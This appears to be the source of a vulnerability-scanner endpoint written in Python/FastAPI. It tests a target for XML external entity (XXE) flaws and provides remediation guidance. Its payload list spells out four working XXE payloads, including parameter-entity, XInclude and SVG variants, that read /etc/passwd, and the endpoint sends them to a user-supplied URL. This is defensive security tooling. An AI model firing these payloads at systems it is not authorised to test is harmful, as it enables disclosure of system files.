"""XXE — 4 variants × 3 content-types, /etc/passwd marker."""
import re
from fastapi import APIRouter, Depends
from tools._shared import (ScanRequest, verify_scan_quota, web_url,
                            safe_request, wrap_finding, standard_response)
router = APIRouter()
_PAYLOADS = [
    ("classic", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'),
    ("parameter-entity", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]><foo>test</foo>'),
    ("xinclude", '<?xml version="1.0"?><foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>'),
    ("svg", '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>'),
]
_CTS = ["application/xml", "text/xml", "application/x-xml"]
_PASSWD = re.compile(r"root:x:0:0:", re.IGNORECASE)

@router.post("/api/scan/xxe")
async def scan_xxe(req: ScanRequest, payload=Depends(verify_scan_quota)):
    url = web_url(req.target)
    findings, tests, confirmed = [], 0, []
    for variant, xml in _PAYLOADS:
        for ct in _CTS:
            tests += 1
            r = safe_request("POST", url,
                headers={"Content-Type": ct, "User-Agent": "VulnusLab/1.0"},
                data=xml, req=req, timeout=10, allow_redirects=False)
            if r is None: continue
            if _PASSWD.search((r.text or "")[:8000]):
                findings.append(wrap_finding(
                    f"XXE — {variant} payload read /etc/passwd via Content-Type: {ct}",
                    "CRITICAL", cvss="9.1", cwe="CWE-611", owasp="A05:2021",
                    remediation="Disable XML external entities. Python: defusedxml. Java: setFeature('http://apache.org/xml/features/disallow-doctype-decl', true). PHP: libxml_disable_entity_loader(true).",
                    evidence_marker=f"POST with {ct} and {variant} XXE returned body containing 'root:x:0:0:'"))
                confirmed.append({"variant": variant, "content_type": ct})
                return standard_response(tool="xxe", target=req.target,
                    findings=findings, tests_performed=tests,
                    tests_summary=f"XXE: {tests} payload×content-type combos",
                    raw_data={"xxe": {"confirmed": confirmed}})
    return standard_response(tool="xxe", target=req.target, findings=findings,
        tests_performed=tests,
        tests_summary=f"XXE: tested {tests} payload×CT combos (classic, parameter-entity, XInclude, SVG)",
        raw_data={"xxe": {"confirmed": confirmed}})
def register(app): app.include_router(router)
